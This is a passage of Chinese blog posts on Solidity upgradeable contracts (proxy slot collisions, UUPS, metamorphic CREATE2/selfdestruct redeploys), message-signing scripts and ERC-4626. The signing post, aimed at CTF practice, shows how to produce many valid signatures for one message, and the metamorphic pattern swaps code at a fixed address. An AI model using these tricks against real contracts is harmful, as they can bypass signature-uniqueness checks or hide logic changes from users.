||--------------------------|-------------------------||... |address _owner ||... |mapping _balances ||... |uint256 _supply ||... |... ||... | ||... | ||... | ||... | ||address _implementation | | &lt;=== Randomized slot.|... | ||... | | 比如在上述的 简单的可升级合约案例中，代理合约的slot0存储的是逻辑合约的地址，如果逻辑合约中也有状态变量则很可能会发生插槽冲突，EIP1967的解决方式是，将implementation的地址存储在随机位置，该随机位置的计算方法如下： 12bytes32 private constant implementationPosition = bytes32(uint256( keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1)); 那么会有人好奇，为什么这样会避免插槽冲突呢。因为keccak256(&#39;eip1967.proxy.implementation&#39;)) - 1)的哈希结果是一个很庞大的数值，要是想实现插槽冲突那得声明多少变量，而合约的大小最大只能为24kb，光部署的成本都已经非常高了，作为智能合约的开发者绝对不会允许这种情况发生。 3.2 复现复现的逻辑是引用 OZ 库的 ERC1967Proxy.sol，旨在解决上述例子中的插槽冲突和逻辑合约代码冗余问题，我准备在逻辑合约中从slot0, slot1, slot2...依次声明较多状态变量，而不像简单的可升级合约案例中预留代理合约声明的状态变量。 123456789101112131415161718192021222324252627// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/ERC1967/ERC1967Proxy.sol&quot;;contract Proxy_Test is ERC1967Proxy &#123; constructor(address implementation) ERC1967Proxy(implementation, &quot;&quot;) &#123;&#125;&#125;contract Logic &#123; uint256 public a; uint256 public b; uint256 public c; uint256 public d; uint256 public e; uint256 public f; function set() public &#123; a = 0; b = 1; c = 2; d = 3; e = 4; f = 5; &#125;&#125; 化繁为简，就不搞那么复杂了。旨在验证通过Proxy_Test合约，委托调用Logic合约的set()函数，验证是否会发生插槽冲突，以及验证Logic合约的状态变量是否被写入逻辑合约中。 执行逻辑： 部署Logic合约，将其地址作为参数传入Proxy_Test合约。 通过Proxy_Test调用set()函数。 通过脚本验证各个插槽的值： 可以看到这没有发生插槽冲突，implementation的值没有发生变化，以及逻辑合约的状态变量的确被写入了代理合约中。 我是在本地开启了测试节点，脚本如下： 1234567891011121314151617import &#123; ethers &#125; from &quot;ethers&quot;;const URL = &quot;HTTP://127.0.0.1:8545&quot;;const provider = new ethers.JsonRpcProvider(URL);let address = &quot;0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9&quot;;async function print() &#123; for (let i = 0; i &lt; 6; i++) &#123; let slot = await provider.getStorage(address, i); console.log(`slot$&#123;i&#125; = $&#123;slot&#125;`); &#125; let implementation = await provider.getStorage(address, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbcn); console.log(`implementation = $&#123;implementation&#125;`);&#125;await print(); 3.3 缺陷 这种代理模式解决了插槽冲突问题，但是并没有解决选择器冲突问题。 安全性较低。 4. 透明代理EIP-1967 透明合约标准 该代理模式旨在解决选择器冲突问题，通常配合EIP1967使用，虽然被弃用了，但是还是值得学习的。 透明代理模式的逻辑是：管理员可能会因为“函数选择器冲突”，在调用逻辑合约的函数时，误调用代理合约的可升级函数。那么限制管理员的权限，不让他调用任何逻辑合约的函数，就能解决冲突。 管理员变成工具人，仅能调用代理合约和可升级函数对合约升级，不能通过回调函数调用逻辑合约。 非管理员用户不能调用升级合约函数，可以通过回调函数调用逻辑合约。 4.1 复现根据上述要求，代理合约的实现如下： 1234567891011121314151617181920212223contract TransparentProxy &#123; address implementation; // logic address admin; string public words; constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallback函数，将调用委托给逻辑合约 // 不能被admin调用，避免选择器冲突引发意外 fallback() external payable &#123; require(msg.sender != admin); (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // 升级函数，改变逻辑合约地址，只能由admin调用 function upgrade(address newImplementation) external &#123; if (msg.sender != admin) revert(); implementation = newImplementation; &#125;&#125; 这样就可以简单的实现 升级函数只能由管理员调用，回调函数不能由管理员调用。 4.2 缺陷 采用EIP1967的存储方式，每一次调用都需要sload读取管理员插槽，消耗的gas成本高。 5. 通用可升级代理 - UUPSUUPS 通用可升级代理 来自 EIP1822，该代理模式是采用伪随机的存储槽存储逻辑合约地址，其实也可以看作是EIP1967的前生，后者将存储槽进行了规范化。 在EIP1822中，逻辑合约的地址存储位置为： 1keccak256(&quot;PROXIABLE&quot;) = 0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7 由于计算结果数值很大，这也就消除了代理和逻辑合约中变量之间发生冲突的可能性。 除此之外，UUPS还解决了选择器冲突问题，它采用的方式是：将升级函数编写于逻辑合约中而不是代理合约中，这样一来就可以直接避免了逻辑合约中的某个函数的函数选择器和升级函数的选择器相同，即使是开发者不经意间写出来了，编译器也会报错，从而很巧妙的解决了这个问题。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"proxy","slug":"DEFI/proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/proxy/"}],"tags":[{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"}]},{"title":"sign a message","slug":"Utils/Solidity/sign_a_message","date":"2024-01-21T04:47:10.000Z","updated":"2024-01-21T04:47:10.000Z","comments":true,"path":"2024/01/21/Utils/Solidity/sign_a_message/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/21/Utils/Solidity/sign_a_message/","excerpt":"","text":"前言 📌靶场刷题遇得到很多关于验证签名的题，在这里汇总一下，消息签名的工具和方法。 1. 采用 web3.py1.1 适用于本地测试 这是不符合当前 以太坊 规定的签名，即未加入\\x19Ethereum Signed Message:\\n32， 适合用于平时在本地复现靶场的简单使用。 12345678910111213141516### 这是没加 \\x19Ethereum Signed Message:\\n32from eth_account import Accountfrom web3 import Web3message = &quot;&quot;privatekey = &quot;&quot;messagehash = Web3.keccak(text=message)signMessage = Account.signHash(message_hash=messagehash, private_key=privatekey)print(&quot;message =&quot;, message)print(&quot;message&#x27;s hash =&quot;,messagehash.hex())print(&quot;v =&quot;, Web3.to_hex(signMessage.v))print(&quot;r =&quot;, Web3.to_hex(signMessage.r))print(&quot;s =&quot;, Web3.to_hex(signMessage.s))print(&quot;signature =&quot;, Web3.to_hex(signMessage.signature)) 1.2 适用于测试网 如下是遵循EIP191协议的签名规则的代码，即加入\\x19Ethereum Signed Message:\\n32。 如下这两种方法和metamask的签名结果一样。 但是如下这里个并不是按照如下的计算方式： 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); 1234567891011121314# 加入了 \\x19Ethereum Signed Message:\\n32from web3.auto import w3from eth_account.messages import encode_defunctmsg = &quot;&quot;private_key = &quot;&quot;message = encode_defunct(text=msg)signed_message = w3.eth.account.sign_message(message, private_key=private_key)print(&quot;message =&quot;, msg)print(&quot;messageHash =&quot;, w3.to_hex(signed_message.messageHash))print(&quot;r =&quot;, w3.to_hex(signed_message.r))print(&quot;s =&quot;, w3.to_hex(signed_message.s))print(&quot;v =&quot;, w3.to_hex(signed_message.v))print(&quot;signature =&quot;, w3.to_hex(signed_message.signature)) 或 1234567891011121314151617181920212223from web3 import Web3, HTTPProviderfrom eth_account.messages import encode_defunct# 私钥private_key = &quot;&quot;rpc = &#x27;https://rpc.ankr.com/eth&#x27; # 遵从主网规则w3 = Web3(HTTPProvider(rpc))msg = &quot;&quot;#构造可签名信息message = encode_defunct(text=msg)# signsigned_message = w3.eth.account.sign_message(message, private_key=private_key)print(&quot;msg =&quot;, msg)print(&quot;msgHash =&quot;, w3.to_hex(signed_message.messageHash))print(&quot;r =&quot;, w3.to_hex(signed_message.r))print(&quot;s =&quot;, w3.to_hex(signed_message.s))print(&quot;v =&quot;, w3.to_hex(signed_message.v))print(&quot;signature = &quot;, w3.to_hex(signed_message.signature)) 代码结果运行图： metamask签名结果图： 2. 采用web3.js web3.js的版本为：&quot;version&quot;: &quot;1.8.0&quot; 这个方法就很牛皮了： 如果输入的data是string类型的：那么ta的运算结果和metamask的结果一样 如果输入的data是hash：那么ta的处理方式就是如下 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); remix代码结果： web3js代码结果： 代码： 123456789var Web3 = require(&#x27;web3&#x27;);var web3 = new Web3(Web3.givenProvider);let dataHash = &quot;&quot;;let privateKey = &quot;&quot;let sign = web3.eth.accounts.sign(dataHash, privateKey);console.log(sign); 3. 采用 ethers.js 版本为：^6.2.3。 该脚本的签名结果和方式和metamask也是一样,遵循EIP191，不会像web3js那样，输入为hash时，不遵守 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); 12345678910111213141516import &#123; ethers &#125; from &quot;ethers&quot;;const RPC = &quot;&quot;;const provider = new ethers.JsonRpcProvider(RPC);const privateKey = &quot;&quot;;const wallet = new ethers.Wallet(privateKey, provider);const message = &quot;&quot;;const messageHash = ethers.hashMessage(message);const signature = await wallet.signMessage(message);console.log(`message = $&#123;messageHash&#125;`);console.log(`signatrue = $&#123;signature&#125;`); 4. 采用ethereum.js 这是未遵循EIP191协议的签名方式 12345678910111213141516171819202122232425const ethereumjsUtil = require(&#x27;ethereumjs-util&#x27;);// 要签名的消息const message = &#x27;stage1&#x27;;// 私钥（注意：这只是一个示例私钥，不应该在实际项目中使用）const privateKey = Buffer.from(&#x27;0000000000000000000000000000000000000000000000000000000000000001&#x27;, &#x27;hex&#x27;);// 生成消息的 Keccak-256 哈希let buffer_message = Buffer.from(message); // 将message转成字节流const messageHash = ethereumjsUtil.keccak256(buffer_message);// 使用私钥对消息哈希进行签名const signature = ethereumjsUtil.ecsign(messageHash, privateKey);// 将签名结果进行格式化const formattedSignature = &#123; v: signature.v, r: signature.r.toString(&#x27;hex&#x27;), s: signature.s.toString(&#x27;hex&#x27;)&#125;;console.log(&#x27;Message:&#x27;, message);console.log(&#x27;Message Hash:&#x27;, messageHash.toString(&#x27;hex&#x27;));console.log(&#x27;Signature:&#x27;, formattedSignature); 5. 签名和消息还原地址1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol&quot;;contract SignMessage &#123; using ECDSA for bytes32; function verifyMessage(string memory message, bytes memory signature) public view returns(address, bool) &#123; //hash the plain text message bytes32 messagehash = keccak256(bytes(message)); address signeraddress = messagehash.recover(signature); if (msg.sender==signeraddress) &#123; //The message is authentic return (signeraddress, true); &#125; else &#123; //msg.sender didnt sign this message. return (signeraddress, false); &#125; &#125;&#125; 或 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SignMessage &#123; // @dev 从_msgHash和签名_signature中恢复signer地址 function recoverSigner(bytes32 _msgHash, bytes memory _signature) public pure returns (address)&#123; // 检查签名长度，65是标准r,s,v签名的长度 require(_signature.length == 65, &quot;invalid signature length&quot;); bytes32 r; bytes32 s; uint8 v; // 目前只能用assembly (内联汇编)来从签名中获得r,s,v的值 assembly &#123; /* 前32 bytes存储签名的长度 (动态数组存储规则) add(sig, 32) = sig的指针 + 32 等效为略过signature的前32 bytes mload(p) 载入从内存地址p起始的接下来32 bytes数据 */ // 读取长度数据后的32 bytes r := mload(add(_signature, 0x20)) // 读取之后的32 bytes s := mload(add(_signature, 0x40)) // 读取最后一个byte v := byte(0, mload(add(_signature, 0x60))) &#125; // 使用ecrecover(全局函数)：利用 msgHash 和 r,s,v 恢复 signer 地址 return ecrecover(_msgHash, v, r, s); &#125;&#125; 6. 实现同一私钥，同一消息，不同签名6.1通过ethereum.js实现 这需要修改ethereum.js的源码，版本为：&quot;version&quot;: &quot;7.1.5&quot;。 修改一：node_modules\\@types\\secp256k1\\index.d.ts 12// 源代码noncefn?: ((message: Uint8Array, privateKey: Uint8Array, algo: Uint8Array | null, data: Uint8Array | null, attempt: number) =&gt; Uint8Array) 这里可以看到data的值被写死了，被默认写成null，所以导致了生成的 options的值是new Uint8Array(0)，这就影响了生成的签名是唯一的”错觉”。如何将这个默认值给去掉，在调用的时候传入随机的options（通过生成随机的Uint8Array数组实现），所以将这里的代码修改为 12// 去掉data的默认值noncefn?: ((message: Uint8Array, privateKey: Uint8Array, algo: Uint8Array | null, data: Uint8Array, attempt: number) =&gt; Uint8Array) | undefined; 修改二：node_modules\\ethereumjs-util\\dist\\signature.js 12// 源码const &#123; signature, recid: recovery &#125; = (0, secp256k1_1.ecdsaSign)(msgHash, privateKey); 可以看到这里没有传入option，即使用了源码的默认option（null），因为上一步修改了option的默认值，所以这里可以传参了，可以引入crypto库，随机生成Uint8Array数组，这样就可以随机生成签名，所以将这里的代码修改为： 12const crypto = require(&#x27;crypto&#x27;); // 先导库const &#123; signature, recid: recovery &#125; = (0, secp256k1_1.ecdsaSign)(msgHash, privateKey, &#123;data:crypto.randomBytes(32)&#125;); // 生成随机数组 在 Node.js 中，crypto.randomBytes() 方法是一个常见的随机数生成方法。 综上，经过两次修改便可以实现使用同一私钥，对同一消息，进行签名可以得到不同的签名值 举例： 签名脚本，使用私钥1，对消息stage1进行签名 123456789101112131415161718192021222324252627const ethereumjsUtil = require(&#x27;ethereumjs-util&#x27;);// 要签名的消息const message = &#x27;stage1&#x27;;// 私钥（注意：这只是一个示例私钥，不应该在实际项目中使用）const privateKey = Buffer.from(&#x27;0000000000000000000000000000000000000000000000000000000000000001&#x27;, &#x27;hex&#x27;);// 生成消息的 Keccak-256 哈希let buffer_message = Buffer.from(message); // 将message转成字节流const messageHash = ethereumjsUtil.keccak256(buffer_message);// 使用私钥对消息哈希进行签名const signature = ethereumjsUtil.ecsign(messageHash, privateKey);// 将签名结果进行格式化const formattedSignature = &#123;v: signature.v,r: signature.r.toString(&#x27;hex&#x27;),s: signature.s.toString(&#x27;hex&#x27;)&#125;;console.log(&#x27;Message:&#x27;, message);console.log(&#x27;Message Hash:&#x27;, messageHash.toString(&#x27;hex&#x27;));console.log(&#x27;Signature:&#x27;, formattedSignature); 运行结果： 可以从结果中看到，生成的签名值不一样，到合约中验证： 12345678910// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Verify &#123; // private key = 0x1 function verify(uint8 v, bytes32 r, bytes32 s) public &#123; require(ecrecover(keccak256(&quot;stage1&quot;), v, r, s) == 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, &quot;who are you?&quot;); &#125;&#125; 运行结果： 从结果中可以看到，生成的这些签名都可以通过验证。 6.2 通过加密库实现 这种方法不能准确获取signature，因为最后的v无法确定，只能猜测，但是v只能是 0x1b 或者 0x1c所以猜对的可能性为0.5，但是也可以实现生成不同签名的功能。 123456789101112131415161718192021222324252627282930313233const secp256k1 = require(&#x27;secp256k1&#x27;);const &#123; randomBytes &#125; = require(&#x27;crypto&#x27;);/** * * @param &#123;*&#125; numSignatures ：生成签名数量 * @param &#123;*&#125; PKey ：私钥 * @param &#123;*&#125; MessageHash ：消息的hash值，不带 `0x` * 这种方法不能准确获取signature，因为最后的v无法确定，只能猜测，但是v只能是 0x1b 或者 0x1c所以猜对的可能性为0.5 */function batchSign(numSignatures, PKey, MessageHash) &#123; const privateKey = Buffer.from(PKey, &#x27;hex&#x27;); const messageHash = Buffer.from(MessageHash, &#x27;hex&#x27;); for (let i = 0; i &lt; numSignatures; i++) &#123; const &#123; signature &#125; = secp256k1.ecdsaSign(messageHash, privateKey, &#123; data: randomBytes(32) &#125;); signatureBytes = Buffer.from(signature) signatureHex = signatureBytes.toString(&#x27;hex&#x27;); const r = signatureHex.slice(0, 64); const s = signatureHex.slice(64); console.log(`Signature $&#123;i + 1&#125;:`); console.log(&quot;Signature:&quot;,`0x$&#123;signatureHex&#125;`); // console.log(&#x27;Signature (v):&#x27;, v); console.log(&#x27;Signature (r):&#x27;, `0x$&#123;r&#125;`); console.log(&#x27;Signature (s):&#x27;, `0x$&#123;s&#125;`); console.log(&#x27;Signature (s):&#x27;,&quot;1b or 1c&quot;); console.log(&#x27;----------------------&#x27;); &#125;&#125;//testbatchSign(5, &quot;0000000000000000000000000000000000000000000000000000000000000001&quot;, &quot;8252a7072c69c0cdba0c0bc059898f7992314306b3f0845bbb76593da6b98311&quot;)","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Solidity","slug":"Utils/Solidity","permalink":"https://biyouqiuqiu.com/categories/Utils/Solidity/"}],"tags":[{"name":"signature","slug":"signature","permalink":"https://biyouqiuqiu.com/tags/signature/"}]},{"title":"Upgradeable Contract without delegatecall","slug":"DEFI/Proxy/深入可升级合约-非代理篇","date":"2024-01-21T04:00:00.000Z","updated":"2024-01-21T04:00:00.000Z","comments":true,"path":"2024/01/21/DEFI/Proxy/深入可升级合约-非代理篇/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/21/DEFI/Proxy/%E6%B7%B1%E5%85%A5%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6-%E9%9D%9E%E4%BB%A3%E7%90%86%E7%AF%87/","excerpt":"","text":"1. 前言 solidity智能合约部署到链上之后，代码是不能再修改的，这样有好也有坏。 好：用户可以知道代码的运行逻辑，不用担心代码被人私自篡改从而执行恶意操作； 坏：一旦发现之前部署的智能合约出现bug，hacker可以利用bug执行恶意操作，而本着合约不可篡改的特性，合约不能进行修复和升级，只能通过重新部署新的合约，而这样一来用户的数据将会被清空，若是要实现数据迁移则付出的gas成本会很高。 正是基于如上痛点，提出了可升级的智能合约的理念，该理念的目的是：实现智能合约在部署之后，还可以进行合约升级。 当下有两种主流的合约升级方式： 数据逻辑分离 代理模式 今天要学习的是采用数据逻辑分离模式实现合约升级。 2. 数据逻辑分离模式将数据和逻辑保存在不同的合约中，逻辑合约负责调用和操作数据合约。这种方式也被称为 永久数据存储模式。 2.1 如何理解如何理解这种模式？ 本质上就是：将逻辑合约和存储数据合约分离成俩个合约，逻辑合约负责调用存储数据合约。 执行逻辑：逻辑合约V1通过call的方式去调用stroage contract，当合约需要升级的时候，将V1替换成V2然后用户通过V2版本的逻辑合约去调用storage contract。 2.2 代码复现对于合约的升级一定是有严格的访问控制的，升级操作需要添加严格的控制权，若是anyone都可以执行升级操作，那么合约很容易报废，待会我会复现。 本次复现的逻辑是：storage contract合约所有者将合约所有者权移交给V1，V1负责操作storage contract，同时它还具有移交storage contract所有权的功能。 代码写得很粗糙，旨在复现逻辑过程 :)。 本次复现使用了三个合约： StorageTickets：负责存储数据，这个合约始终是不变的，负责记录票数和账户是否投票的情况 V1：逻辑合约的V1版本，具有投票和查询票数功能，还具有转移 StorageTickts合约所有权的功能（具有访问控制）。 V2：逻辑合约的V2版本，具有投票和查询票数功能，但是每个用户只能投一次，还具有转移 StorageTickts合约所有权的功能（具有访问控制）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol&quot;;contract StorageTickets is Ownable &#123; mapping(bytes32 =&gt; uint) VoteAmounts; // solt 1 mapping(address =&gt; bool) BooleanVote; // slot 2 constructor() Ownable(msg.sender) &#123;&#125; function getVoteAmounts(bytes32 record) public view returns (uint) &#123; return VoteAmounts[record]; &#125; function setVoteAmounts(bytes32 record, uint value) public &#123; VoteAmounts[record] = value; &#125; function getBooleanVote(address account) public view returns (bool)&#123; return BooleanVote[account]; &#125; function setBooleanVote(address account, bool value) public &#123; BooleanVote[account] = value; &#125;&#125;// V1 版本contract V1 &#123; address owner; StorageTickets storageTickets; constructor(address _storageTickets) &#123; owner = msg.sender; storageTickets = StorageTickets(_storageTickets); &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; // 查询 keccak256(abi.encodePacked(&quot;votes&quot;))获取的票数 function getNumberOfVotes() public view returns (uint256) &#123; bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); return storageTickets.getVoteAmounts(votes); &#125; // 投票 function vote() public &#123; bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); storageTickets.setVoteAmounts(votes, storageTickets.getVoteAmounts(votes) + 1); &#125; function transferOwner(address _newOwner) public onlyOwner &#123; storageTickets.transferOwnership(_newOwner); &#125;&#125; 先部署 StorageTickets.sol 将部署生成的地址作为V1构造器的参数，部署V1 StorageTickets的所有者将所有权通过transferOwnerShip()函数，移交所有权给V1 用户0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db连续5次点击V1的vote函数，可以看到票数为5。 假如此时项目方发现这个明显的bug，没有限制每个用户的投票次数，这可能会导致有人恶意刷单，项目方明确规定每人只能投一次票，那么很明显合约需要升级，升级成V2版本。 12345678910111213141516171819202122232425262728293031323334// V2 版本contract V2 &#123; address owner; StorageTickets storageTickets; constructor(address _storageTickets) &#123; owner = msg.sender; storageTickets = StorageTickets(_storageTickets); &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; // 查询 keccak256(abi.encodePacked(&quot;votes&quot;))获取的票数 function getNumberOfVotes() public view returns (uint256) &#123; bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); return storageTickets.getVoteAmounts(votes); &#125; // 投票 function vote() public &#123; require(storageTickets.getBooleanVote(msg.sender) == false, &quot;Fail, you have already voted:)&quot;); storageTickets.setBooleanVote(msg.sender, true); bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); storageTickets.setVoteAmounts(votes, storageTickets.getVoteAmounts(votes) + 1); &#125; function transferOwner(address _newOwner) public onlyOwner &#123; storageTickets.transferOwnership(_newOwner); &#125;&#125; 还是传入原始的storageTickets合约地址部署V2 V1合约的所有者移交所有权给V2 此时keacck256(&quot;vote&quot;)的票数还是5票 用户0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db还想像之前那样不断的投票，当他第二次进行投票时，他的操作被revert()了。 2.3 优缺点优点： 容易理解和上手 消除了合约更新后数据的迁移问题 缺点： 数据变量的访问模式很困难，比如需要在数据合约中添加一个变量而完成某种的功能，这几乎不可能实现，除非重新部署一个数据合约，那么这还是需要大量的gas成本 增加了复杂的所有权授权模式 3. Metamorphic Contracts译文：变形合约。 忽略数据不变性，这也算是一种可升级合约的方式，这是采用create2的操作码实现的。众所周知，在以太坊中部署合约可以获取到一个地址，在代码中操作的也是合约地址，那么理论上，一个合约地址可以看成是一个合约，合约地址不变，那么就可以间接看作是合约没有改变。而通过create2操作码进行升级的理念便是，在同一个合约地址上部署上不同的逻辑，合约的执行逻辑主要是依靠runtimeCode，这要每次部署合约时传入的runtimeCode不一样就能实现。 3.1 复现那么如何重复部署同一个合约地址呢？ 这需要用到selfdestruct和create2盐。selfdestruct负责销毁合约，只有销毁了合约才能再部署同一合约地址，此外，自毁功能是必须要提供的，否则该升级模式将会失败。而且自毁功能需要有访问控制。 12// create2部署合约的原理0xFF + address(deployer) + salt+ keccak256(creationCode) 通过create2部署合约到同一个地址，0xFF、address(deployer)和salt容易保证不变，但是要替换原合约的逻辑，则必须要更改合约的内容，这样一来creationCode不就会发生改变了吗，有什么办法能保证creationCode不变，而runtimeCode改变？ 答案：有的。可以通过solidity的汇编语言，返回函数的runtimecode，而这个runtimeCode从构造器中传入，直接看代码。 1234567891011contract Target &#123; constructor() &#123; Factory factory = Factory(msg.sender); bytes memory runtimeCode = factory.runtimeCode(); assembly &#123; return(add(runtimeCode, 0x20), mload(runtimeCode)) &#125; &#125;&#125; 这是目标合约，通过Target的creationCode不变，从而达成上述要求。 12345678910111213141516171819202122232425contract Factory &#123; address public owner; bytes public runtimeCode; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function deploy(bytes memory _runtimeCode) external onlyOwner returns(address target) &#123; runtimeCode = _runtimeCode; bytes memory creationCode = type(Target).creationCode; assembly &#123; target := create2( 0, // msg.value add(creationCode, 0x20), // the start of data mload(creationCode), // creationCode.length 0x00 // salt ) &#125; &#125;&#125; 这是工厂合约负责部署目标合约，部署功能需要有访问控制，预防恶意操作。 复现： 测试合约： 12345678910111213141516171819contract Test &#123; address target; constructor(address _target) &#123; target = _target; &#125; function test() public returns(uint256) &#123; (bool ok, bytes memory rtd) = target.call(abi.encodeWithSignature(&quot;cal(uint256,uint256)&quot;, 1, 2)); require(ok, &quot;call fail:)&quot;); return abi.decode(rtd, (uint256)); &#125; function kill() public &#123; (bool ok, bytes memory rtd) = target.call(abi.encodeWithSignature(&quot;kill()&quot;)); require(ok, &quot;kill fail(:&quot;); &#125;&#125; 辅助合约，获取V1和V2的runtimeCode： 1234567891011contract GetRuntimeCode &#123; function getV1() public pure returns (bytes memory)&#123; return type(Logic_V1).runtimeCode; &#125; function getV2() public pure returns (bytes memory)&#123; return type(Logic_V2).runtimeCode; &#125;&#125; 逻辑合约V1，计算方式为加法运算: 12345678910contract Logic_V1 &#123; function cal(uint256 n1, uint256 n2) external pure returns (uint256) &#123; return n1 + n2; &#125; function kill() public &#123; selfdestruct(payable(msg.sender)); &#125;&#125; 逻辑合约V2，计算方式为乘法运算： 12345678910contract Logic_V2 &#123; function cal(uint256 n1, uint256 n2) external pure returns (uint256) &#123; return n1 * n2; &#125; function kill() public &#123; selfdestruct(payable(tx.origin)); &#125;&#125; 执行逻辑： 部署GetRuntimeCode合约 部署Factory合约 通过GetRuntimeCode合约的getV1()函数获取，V1的runtimeCode: run_v1。 将run_v1作为参数，调用deploy()函数，部署Target合约， 地址为：0x0c1720ee8283EB0D46170ba774098Ae648C701c1。 将该地址作为参数，部署Test合约，并调用 test()函数，结果如下： 升级逻辑： 调用 Test合约的kill函数，将target合约销毁。 通过GetRuntimeCode合约的getV2()函数获取，V2的runtimeCode: run_v2。 将run_v2作为参数，调用deploy()函数，部署Target合约， 随后继续调用 test()函数，结果如下： 此时，你会发现结果还是原来的3，这是为什么呢？？？ 这是因为在EIP-4756中提及过，将移除selfdestruct这一操作码，这也是该种合约升级模式的弊端之一。 看到我使用的编译版本： 在Cancun硬分叉之后，这个自毁功能是被移除了的，那么该如何复现呢？ 答案：换一个网络，以及换低版本编译器。我换成如下： 再次重复如上步骤，输出结果为：2。 复现完毕。当然实际案例需要添加访问控制。 3.2 谈谈该模式的好与坏 好： 不需要使用delegatecall代理，效率高不需要转发调度。 不需要使用initialize()代替constructor()。 坏： selfdestruct在接下来的网络升级中会可能会被移除。 selfdestruct会将合约数据抹除。 需要的成本较高，升级一次需要执行一次selfdestruct和部署一次合约。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"proxy","slug":"DEFI/proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/proxy/"}],"tags":[{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"}]},{"title":"ERC4626","slug":"DEFI/ERC/ERC4626","date":"2024-01-20T04:00:00.000Z","updated":"2024-01-20T04:00:00.000Z","comments":true,"path":"2024/01/20/DEFI/ERC/ERC4626/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/20/DEFI/ERC/ERC4626/","excerpt":"","text":"1. ERC4626简介 ERC4626 协议是一种用于代币化保险库的标准，它可以优化和统一收益保险库的技术参数。收益保险库是指使用不同策略来为用户提供最佳收益的合约，例如借贷市场、聚合器或本身具有利息的代币。ERC4626 协议提供了一个标准的 API，用于表示单个底层 ERC-20 代币的收益保险库份额。 用户通过存入 ERC20 Token，从而获取一定比例的 vToken。在erc20 Token 存入的过程中，会在一定的时间内产生收益。在收益到期后，用户可以通过持有的vToken个数，获得一定比例的收益汇报。 此外ERC4626继承了ERC20，具有ERC20所具有的所有功能，而且还必须实现 IERC20Metadata接口。 举个例子来理解这个系统， ERC4626的基础代币可以比作是 黄金（_asset）， 而通过存入 黄金来获取钞票（shares），既可以通过存入黄金来获取shares，也可以通过shares兑换出黄金。例子不是很准确，但是可以初步了解这是一个什么东西。 2. ERC4626代码解读源代码：链接。 接口中定义的函数如下： asset(): 返回保险库使用的底层代币的地址，必须是一个 ERC-20 合约。 totalAssets(): 返回保险库持有的底层资产的总量，应该包括任何由收益产生的复利。 convertToShares(): 返回保险库为给定数量的底层资产兑换的份额数量。 convertToAssets(): 返回保险库为给定数量的份额兑换的底层资产数量。 maxDeposit(): 返回接收者在单次存款调用中可以存入的底层资产的最大数量。 previewDeposit(): 允许用户在当前区块模拟他们的存款效果。 deposit(): 将底层资产存入保险库，并将份额授予接收者。 maxMint(): 返回接收者在单次铸造调用中可以铸造的份额的最大数量。 previewMint(): 允许用户在当前区块模拟他们的铸造效果。 mint(): 将份额铸造给接收者，并从保险库中取出相应数量的底层资产。 maxWithdraw(): 返回接收者在单次取款调用中可以取出的底层资产的最大数量。 previewWithdraw(): 允许用户在当前区块模拟他们的取款效果。 withdraw(): 将份额从接收者处销毁，并将相应数量的底层资产从保险库中取出。 maxRedeem(): 返回接收者在单次赎回调用中可以赎回的份额的最大数量。 previewRedeem(): 允许用户在当前区块模拟他们的赎回效果。 redeem(): 将份额从接收者处销毁，并将相应数量的底层资产从保险库中取出。 主合约： 1IERC20 private immutable _asset; 这是该金库 vault的基础代币，相当于黄金。 1function _tryGetAssetDecimals(IERC20 asset_) private view returns (bool, uint8) 该函数的作用是获取 基础代币的精度值，通过 staticcall来调用assert_的 decimals()函数获取该角度值，如果调用成功则返回(true, uint8(returnedDecimals))，否则(false, 0)。 12function maxDeposit(address) public view virtual returns (uint256)function maxMint(address) public view virtual returns (uint256) 查询指定地址可以存入&#x2F;铸造最多的数目，二者都返回type(uint256).max。 1function maxRedeem(address owner) public view virtual returns (uint256) 